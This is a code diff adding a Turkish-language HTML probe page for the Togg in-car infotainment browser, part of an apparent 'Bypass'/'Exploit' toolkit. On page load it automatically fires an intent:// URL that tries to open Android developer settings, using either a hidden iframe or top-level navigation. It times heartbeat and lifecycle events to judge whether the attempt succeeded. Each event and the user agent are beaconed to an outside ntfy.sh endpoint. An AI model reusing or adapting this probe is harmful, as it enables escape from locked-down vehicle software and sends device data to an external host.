@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="color-scheme" content="dark">
+<title>Togg IVI — devopt FLAG_SECURE ayırt probu</title>
+<link rel="stylesheet" href="style.css">
+<style>
+  #verdict{font-size:17px;font-weight:bold;padding:10px;border-radius:8px;margin:10px 0}
+  .ok{background:#14361f;border:1px solid #2e7d32;color:#8ff0a4}
+  .bad{background:#3a1414;border:1px solid #7d2e2e;color:#ff9c9c}
+  .unk{background:#3a3314;border:1px solid #7d6f2e;color:#ffe89c}
+  .hb{background:#0e151d;border:1px solid #2b3644;color:#9fb4c8}
+  pre#o{white-space:pre-wrap;font-size:13px;max-height:46vh;overflow:auto}
+  .b{border-radius:6px;padding:5px 10px;border:1px solid #2b3644;background:#0e151d;color:#e6edf3;font:inherit;cursor:pointer}
+  .b.run{background:#f44336;color:#fff;border-color:#f44336}
+  #pip{position:fixed;right:8px;bottom:8px;background:#0e151d;border:1px solid #2b3644;
+       border-radius:8px;padding:6px 10px;font:13px monospace;color:#8ff0a4;z-index:9}
+</style>
+</head>
+<body>
+
+<nav class="tabs">
+  <a href="index.html">🎯 Bypass</a>
+  <a href="probe.html">🔬 Ortam</a>
+  <a href="exploit.html">💣 Oto-Test</a>
+  <a class="active" href="devopt.html">🔒 devopt Ayrım</a>
+</nav>
+
+<h1>🔒 devopt — FLAG_SECURE / navigasyon ayırt probu</h1>
+<p class="sub">Tek vektör: <code>intent://…APPLICATION_DEVELOPMENT_SETTINGS</code>. Ekran karardığında hangisi olduğunu <b>heartbeat sürekliliği</b> ile ayırır:
+<b>HB akmaya devam</b> ederse → sayfa canlı, üstte <b>FLAG_SECURE</b> pencere (yakalama koruması) var (kısmi ilerleme);
+<b>HB kesilir</b> ve <b>PAGEHIDE</b> gelirse → gerçek navigasyon/uygulama açıldı;
+<b>HB kesilir, PAGEHIDE yok, sonra kendiliğinden RESUME</b> → display-off/timeout.
+Her adım <b>ntfy</b>’ye akar. Kendi aracında, park hâlinde.</p>
+
+<div id="verdict" class="unk">Hazır — açılışta otomatik çalışır (#noauto ile durdur).</div>
+
+<div class="box">
+  <button class="b run" id="run">▶ devopt dene (strict iframe)</button>
+  <button class="b" id="runnav">↗ devopt dene (üst nav)</button>
+  <button class="b" id="send">📡 Özet gönder</button>
+  <button class="b" id="clear">Temizle</button>
+</div>
+
+<div class="box">
+  <h3>📋 Ayrım tablosu</h3>
+  <table id="tbl">
+    <thead><tr><th>Sinyal</th><th>Değer</th><th>Yorum</th></tr></thead>
+    <tbody id="rows"></tbody>
+  </table>
+</div>
+
+<div class="box">
+  <h3>Canlı beacon</h3>
+  <pre id="o" class="log-box">init</pre>
+</div>
+
+<div id="pip">HB: –</div>
+
+<footer>Yalnız park hâlinde · <a href="exploit.html">← Oto-Test</a></footer>
+
+<script>
+(function(){
+"use strict";
+
+var NT = "https://ntfy.sh/toggx-ivi-7f3k9q2m";
+var CF = location.href.split("#")[0];
+var FORCE_NAV = location.hash.indexOf("nav") >= 0;
+var NOAUTO = location.hash.indexOf("noauto") >= 0;
+
+var SID = (function(){
+  try{
+    var s = sessionStorage.getItem("devopt_sid");
+    if(!s){ s = (crypto.randomUUID ? crypto.randomUUID() : (Date.now()+"-"+Math.random().toString(16).slice(2))); sessionStorage.setItem("devopt_sid", s); }
+    return String(s).slice(0,8);
+  }catch(e){ return "x"; }
+})();
+
+var T0 = Date.now();
+function ms(){ return Date.now() - T0; }
+
+var SIGN = {};           // sinyal -> deger
+var hbN = 0, hbLast = 0, hbGapMax = 0, hbAlive = false;
+var hiddenAt = 0, lastHiddenGap = 0;
+var pagehid = false, froze = false, blurred = false;
+
+function logln(s){
+  var o = document.getElementById("o");
+  if(o){ o.textContent += "\n" + s; o.scrollTop = o.scrollHeight; }
+}
+function report(msg){
+  try{ fetch(NT, {method:"POST", mode:"no-cors", body:msg, keepalive:true}).catch(function(){}); }catch(e){}
+}
+function beacon(msg){                       // unload yollarinda daha guvenilir
+  try{ if(navigator.sendBeacon){ navigator.sendBeacon(NT, msg); } else { report(msg); } }catch(e){}
+}
+function emit(tag, msg){ var line = tag + " sid=" + SID + " t=" + ms() + " " + (msg||""); logln(line); report(line); }
+function emitB(tag, msg){ var line = tag + " sid=" + SID + " t=" + ms() + " " + (msg||""); logln(line); beacon(line); }
+
+function setSign(k, v){ SIGN[k] = v; render(); }
+
+function render(){
+  var rows = [
+    ["SID", SID, "oturum kimliği"],
+    ["HB_max_gap_ms", String(hbGapMax), hbAlive ? "sayfa karartma boyunca CANLI (FLAG_SECURE lehine)" : (hbGapMax >= 2500 ? "HB KESİLDİ (navigasyon/off)" : "-")],
+    ["HB_count", String(hbN), "toplam heartbeat"],
+    ["visibility", SIGN.vis || document.visibilityState, "görünürlük"],
+    ["pagehide", pagehid ? "VAR (t="+SIGN.pagehide_t+")" : "yok", pagehid ? "sayfa bırakıldı → gerçek navigasyon" : "bırakılmadı"],
+    ["freeze", froze ? "VAR" : "yok", froze ? "arka plana atıldı" : "-"],
+    ["blur", blurred ? "VAR" : "yok", blurred ? "başka pencere/orak odak aldı" : "-"],
+    ["last_hidden_gap_ms", String(lastHiddenGap), lastHiddenGap ? "gizli kalma süresi (RESUME gap)" : "-"],
+    ["mode", FORCE_NAV ? "nav(üst)" : "strict(iframe)", "deneme modu"]
+  ];
+  var tb = document.getElementById("rows"); if(!tb) return;
+  tb.innerHTML = "";
+  rows.forEach(function(r){
+    var tr = document.createElement("tr");
+    tr.innerHTML = '<td>'+r[0]+'</td><td class="st">'+r[1]+'</td><td>'+r[2]+'</td>';
+    tb.appendChild(tr);
+  });
+}
+
+/* ---- heartbeat: karartma boyunca surer mi? ---- */
+function startHB(){
+  hbAlive = true;
+  var iv = setInterval(function(){
+    var now = Date.now();
+    if(hbLast){ var g = now - hbLast; if(g > hbGapMax){ hbGapMax = g; } }
+    hbLast = now; hbN++;
+    var pip = document.getElementById("pip");
+    if(pip){ pip.textContent = "HB:" + hbN + " vis=" + document.visibilityState + " gap=" + hbGapMax + "ms"; }
+    if(hbN <= 3 || hbN % 5 === 0){ emit("HB", "n="+hbN+" vis="+document.visibilityState); }
+    if(ms() > 45000){ clearInterval(iv); hbAlive = false; emit("HB_END","n="+hbN+" maxgap="+hbGapMax); finalize(); }
+  }, 1000);
+  setSign("hb_alive","1");
+}
+
+function finalize(){
+  var verdict, cls;
+  if(hbAlive && !pagehid && !froze){ verdict = "CANLI (FLAG_SECURE overlay lehine)"; cls = "ok"; }
+  else if(pagehid){ verdict = "GERÇEK NAVİGASYON (pagehide)"; cls = "bad"; }
+  else if(froze){ verdict = "ARKA PLANA ATILDI (freeze)"; cls = "unk"; }
+  else { verdict = "DEĞERLENDİR: HB gap=" + hbGapMax + "ms"; cls = "unk"; }
+  var dv = document.getElementById("verdict"); if(dv){ dv.className = cls; dv.textContent = "SONUÇ: " + verdict; }
+  emit("FINAL", "verdict="+verdict+" hbN="+hbN+" maxgap="+hbGapMax+" pagehide="+pagehid+" freeze="+froze+" vis="+document.visibilityState);
+}
+
+/* ---- olaylar ---- */
+document.addEventListener("visibilitychange", function(){
+  var v = document.visibilityState; setSign("vis", v);
+  if(v === "hidden"){ hiddenAt = Date.now(); emitB("VIS_HIDDEN", "state=hidden"); }
+  else{
+    if(hiddenAt){ lastHiddenGap = Date.now() - hiddenAt; hiddenAt = 0; }
+    emit("VIS_VISIBLE", "hidgap="+lastHiddenGap+"ms");
+  }
+});
+document.addEventListener("pagehide", function(){ pagehid = true; setSign("pagehide_t", ms()); emitB("PAGEHIDE","evt"); });
+window.addEventListener("beforeunload", function(){ emitB("BEFOREUNLOAD","evt"); });
+document.addEventListener("freeze", function(){ froze = true; emitB("FREEZE","evt"); });
+document.addEventListener("resume", function(){ emit("RESUME_EVT","evt"); });
+window.addEventListener("blur", function(){ blurred = true; emit("BLUR","evt"); });
+window.addEventListener("focus", function(){ emit("FOCUS","evt"); });
+window.addEventListener("pageshow", function(ev){ emit("PAGESHOW","persisted="+(ev&&ev.persisted)); });
+
+/* ---- vektor ---- */
+var URLDEV = "intent://x/#Intent;action=android.settings.APPLICATION_DEVELOPMENT_SETTINGS;launchFlags=0x10000000;S.browser_fallback_url=FB;end";
+function buildUrl(){
+  var fb = encodeURIComponent(CF + "#fail=devopt&noauto");
+  return URLDEV.replace("FB", fb);
+}
+
+var _ifr = null;
+function probeStrict(){
+  if(_ifr){ try{ document.body.removeChild(_ifr); }catch(e){} _ifr = null; }
+  var f = document.createElement("iframe");
+  f.setAttribute("sandbox","allow-scripts allow-same-origin");
+  f.style.cssText = "position:fixed;left:-9999px;top:0;width:2px;height:2px;border:0";
+  var settled = false;
+  function done(st, note){
+    if(settled) return; settled = true;
+    setSign("iframe_result", st);
+    emit("IFRAME_RESULT", st + " " + (note||""));
+    try{ document.body.removeChild(f); }catch(e){}
+    if(_ifr === f) _ifr = null;
+  }
+  f.onload = function(){ done("YÜKLENDİ","üst sayfa korundu"); };
+  f.onerror = function(){ done("YOK","şema iframe'de çözülmez"); };
+  f.src = buildUrl(); document.body.appendChild(f); _ifr = f;
+  setTimeout(function(){ if(!settled) done("SESSİZ","3s yanıt yok"); }, 3000);
+}
+
+function go(forceNav){
+  emit("TRY", "vector=devopt mode=" + (forceNav ? "nav" : "strict"));
+  try{ localStorage.setItem("devopt_last", String(Date.now())); }catch(e){}
+  if(forceNav || FORCE_NAV){ try{ location.href = buildUrl(); }catch(e){ emit("NAV_ERR", String(e).slice(0,80)); } return; }
+  probeStrict();
+}
+
+document.getElementById("run").onclick = function(){ go(false); };
+document.getElementById("runnav").onclick = function(){ go(true); };
+document.getElementById("send").onclick = function(){
+  report("DEVOPT_SUMMARY " + JSON.stringify({ sid: SID, hbN: hbN, hbGapMax: hbGapMax, pagehide: pagehid, freeze: froze, blur: blurred, vis: document.visibilityState, iframe: SIGN.iframe_result || "-" }));
+  alert("Özet gönderildi");
+};
+document.getElementById("clear").onclick = function(){
+  try{ sessionStorage.removeItem("devopt_sid"); }catch(e){}
+  location.reload();
+};
+
+// fallback donusu
+var m = location.hash.match(/#fail=([a-z_]+)/);
+if(m){ emit("FALLBACK", "vector=" + m[1] + " (uygulama açılmadı/fallback döndü)"); }
+
+render();
+emit("PAGE_OPEN", "mode=" + (FORCE_NAV ? "nav" : "strict") + " ua=" + navigator.userAgent);
+startHB();
+if(!NOAUTO){ setTimeout(function(){ go(false); }, 900); }
+})();
+</script>
+</body>
+</html>
